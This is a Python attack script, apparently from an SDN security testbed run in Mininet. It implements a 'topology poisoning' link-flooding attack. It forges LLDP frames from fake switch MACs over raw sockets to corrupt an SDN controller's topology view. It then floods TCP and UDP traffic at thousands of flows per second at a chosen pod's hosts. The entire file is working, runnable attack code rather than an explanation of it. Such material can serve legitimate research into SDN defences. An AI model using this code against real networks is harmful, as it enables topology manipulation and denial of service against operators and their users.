#!/usr/bin/env python3
"""
Topology Poisoning LFA
======================
Injects fake LLDP packets to manipulate SDN controller's topology view,
then floods through the corrupted paths.

Note: LLDP injection requires raw sockets (root privileges)

Usage:
    mininet> xterm h1
    # In xterm:
    root@mininet# python3 attacks/attack_topology_poisoning.py --interface h1-eth0 --target-pod 2 --duration 300 --rate 4000
"""

import socket
import random
import time
import argparse
import threading
import struct
import os

TOPOLOGY = {
    0: ['10.0.0.1', '10.0.0.2', '10.0.1.1', '10.0.1.2'],
    1: ['10.1.0.1', '10.1.0.2', '10.1.1.1', '10.1.1.2'],
    2: ['10.2.0.1', '10.2.0.2', '10.2.1.1', '10.2.1.2'],
    3: ['10.3.0.1', '10.3.0.2', '10.3.1.1', '10.3.1.2']
}

# Fake switch IDs for topology poisoning
FAKE_SWITCHES = [
    'aa:bb:cc:dd:ee:f1',
    'aa:bb:cc:dd:ee:f2', 
    'aa:bb:cc:dd:ee:f3'
]


class LLDPInjector:
    """Inject fake LLDP packets to corrupt topology"""
    
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.injection_count = 0
        
    def create_fake_lldp(self, fake_switch_mac, fake_port_id):
        """Create fake LLDP frame"""
        # LLDP multicast destination
        dst_mac = bytes.fromhex('0180c200000e')
        src_mac = bytes.fromhex(fake_switch_mac.replace(':', ''))
        ethertype = bytes.fromhex('88cc')  # LLDP
        
        # LLDP TLVs
        # Chassis ID TLV (Type=1, Length=7)
        chassis_tlv = bytes([0x02, 0x07, 0x04]) + src_mac
        
        # Port ID TLV (Type=2)
        port_id_str = f'port-{fake_port_id}'.encode()
        port_tlv = bytes([0x04, len(port_id_str) + 1, 0x05]) + port_id_str
        
        # TTL TLV (Type=3, 120 seconds)
        ttl_tlv = bytes([0x06, 0x02, 0x00, 0x78])
        
        # System Name TLV
        sys_name = f'fake-sw-{fake_port_id}'.encode()
        sys_tlv = bytes([0x0a, len(sys_name)]) + sys_name
        
        # End of LLDPDU
        end_tlv = bytes([0x00, 0x00])
        
        # Assemble frame
        frame = dst_mac + src_mac + ethertype + chassis_tlv + port_tlv + ttl_tlv + sys_tlv + end_tlv
        
        # Pad to minimum frame size
        if len(frame) < 64:
            frame += bytes([0] * (64 - len(frame)))
        
        return frame
    
    def inject_lldp_burst(self, num_frames=50):
        """Inject burst of fake LLDP frames"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            sock.bind((self.interface, 0))
            
            for i in range(num_frames):
                fake_mac = random.choice(FAKE_SWITCHES)
                fake_port = random.randint(1, 48)
                frame = self.create_fake_lldp(fake_mac, fake_port)
                sock.send(frame)
                self.injection_count += 1
                time.sleep(0.01)
            
            sock.close()
            return True
        except PermissionError:
            print("[TOPO-POISON] Error: Need root privileges for raw socket")
            return False
        except Exception as e:
            print(f"[TOPO-POISON] LLDP injection failed: {e}")
            return False
    
    def continuous_injection(self, duration):
        """Continuously inject fake LLDP during attack"""
        start_time = time.time()
        print(f"[TOPO-POISON] Starting LLDP injection (may need root)")
        
        while (time.time() - start_time) < duration:
            success = self.inject_lldp_burst(20)
            if not success:
                print("[TOPO-POISON] Switching to simulation mode (no LLDP)")
                break
            time.sleep(5)  # Inject every 5 seconds
        
        print(f"[TOPO-POISON] LLDP injection complete: {self.injection_count} frames")


class TopologyPoisonedFloodGenerator:
    """Generate flooding traffic through poisoned topology paths"""
    
    def __init__(self, target_ips, rate=4000):
        self.target_ips = target_ips
        self.rate = rate
        self.active = False
        self.stats = {'flows': 0, 'packets': 0, 'bytes': 0}
    
    def generate_tcp_flow(self, target_ip):
        """Generate TCP flow"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            # Target ports that would traverse inter-pod links
            target_port = random.choice([80, 443, 8080, 22, 3306, 5432, 27017])
            
            try:
                sock.connect((target_ip, target_port))
                # Send data to establish flow
                num_packets = random.randint(15, 80)
                for _ in range(num_packets):
                    payload_size = random.randint(300, 1400)
                    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                    sock.send(payload)
                    self.stats['bytes'] += payload_size
                    self.stats['packets'] += 1
                    time.sleep(random.uniform(0.002, 0.015))
            except:
                pass
            finally:
                sock.close()
                self.stats['flows'] += 1
        except:
            pass
    
    def generate_udp_flow(self, target_ip):
        """Generate UDP flow"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_port = random.randint(10000, 65000)
            sock.bind(('', source_port))
            
            target_port = random.choice([53, 123, 161, 514, 5060])
            
            num_packets = random.randint(10, 60)
            for _ in range(num_packets):
                payload_size = random.randint(200, 1200)
                payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                sock.sendto(payload, (target_ip, target_port))
                self.stats['bytes'] += payload_size
                self.stats['packets'] += 1
                time.sleep(random.uniform(0.001, 0.01))
            
            sock.close()
            self.stats['flows'] += 1
        except:
            pass
    
    def run_attack(self, duration):
        """Execute flooding phase after topology poisoning"""
        self.active = True
        start_time = time.time()
        flow_interval = 1.0 / self.rate if self.rate > 0 else 0.001
        
        print(f"[TOPO-POISON] Starting flooding phase")
        print(f"  Rate: {self.rate} flows/sec")
        print(f"  Targets: {', '.join(self.target_ips)}")
        
        while self.active and (time.time() - start_time) < duration:
            target_ip = random.choice(self.target_ips)
            
            if random.random() < 0.65:
                self.generate_tcp_flow(target_ip)
            else:
                self.generate_udp_flow(target_ip)
            
            time.sleep(flow_interval)
            
            if int(time.time() - start_time) % 15 == 0 and self.stats['flows'] > 0:
                elapsed = time.time() - start_time
                print(f"[TOPO-POISON] {elapsed:.0f}s - Flows: {self.stats['flows']:,}, "
                      f"Rate: {self.stats['flows']/elapsed:.1f} flows/s")
        
        self.active = False
        total_time = time.time() - start_time
        print(f"\n[TOPO-POISON] Flooding Complete:")
        print(f"  Total flows:  {self.stats['flows']:,}")
        print(f"  Total pkts:   {self.stats['packets']:,}")
        print(f"  Total bytes:  {self.stats['bytes']:,}")


class TopologyPoisoningAttack:
    """Orchestrate topology poisoning + flooding"""
    
    def __init__(self, interface, target_pod, rate=4000):
        self.interface = interface
        self.target_ips = TOPOLOGY[target_pod]
        self.rate = rate
        self.lldp_injector = LLDPInjector(interface)
        self.flood_gen = TopologyPoisonedFloodGenerator(self.target_ips, rate)
    
    def launch(self, duration):
        """Launch three-phase attack"""
        print(f"\n{'='*70}")
        print(f"  Topology Poisoning LFA Attack")
        print(f"{'='*70}")
        print(f"  Interface:   {self.interface}")
        print(f"  Targets:     {', '.join(self.target_ips)}")
        print(f"  Flood rate:  {self.rate} flows/sec")
        print(f"  Duration:    {duration}s")
        print(f"  Est. flows:  {self.rate * duration:,}")
        print(f"{'='*70}\n")
        
        # Phase 1: Initial LLDP poisoning burst
        print("[TOPO-POISON] Phase 1: Initial topology corruption")
        self.lldp_injector.inject_lldp_burst(100)
        time.sleep(2)
        
        # Phase 2 & 3: Concurrent LLDP injection + flooding
        print("[TOPO-POISON] Phase 2 & 3: Concurrent LLDP + flooding")
        
        lldp_thread = threading.Thread(
            target=self.lldp_injector.continuous_injection,
            args=(duration,)
        )
        flood_thread = threading.Thread(
            target=self.flood_gen.run_attack,
            args=(duration,)
        )
        
        lldp_thread.start()
        time.sleep(0.5)
        flood_thread.start()
        
        lldp_thread.join()
        flood_thread.join()
        
        print(f"\n{'='*70}")
        print(f"  FINAL STATISTICS")
        print(f"{'='*70}")
        print(f"  LLDP frames:   {self.lldp_injector.injection_count:,}")
        print(f"  Flood flows:   {self.flood_gen.stats['flows']:,}")
        print(f"  Flood packets: {self.flood_gen.stats['packets']:,}")
        print(f"  Total bytes:   {self.flood_gen.stats['bytes']:,} "
              f"({self.flood_gen.stats['bytes']/1e6:.2f} MB)")
        print(f"{'='*70}\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Topology Poisoning LFA')
    parser.add_argument('--interface', default='eth0',
                        help='Network interface for LLDP injection (e.g., h1-eth0)')
    parser.add_argument('--target-pod', type=int, default=2, choices=[0,1,2,3])
    parser.add_argument('--duration', type=int, default=300)
    parser.add_argument('--rate', type=int, default=4000,
                        help='Flooding rate (flows/sec)')
    
    args = parser.parse_args()
    
    # Check root privileges
    if os.geteuid() != 0:
        print("[WARNING] Not running as root - LLDP injection will be simulated")
        print("          For real LLDP injection, run with sudo")
    
    attack = TopologyPoisoningAttack(
        interface=args.interface,
        target_pod=args.target_pod,
        rate=args.rate
    )
    
    attack.launch(args.duration)
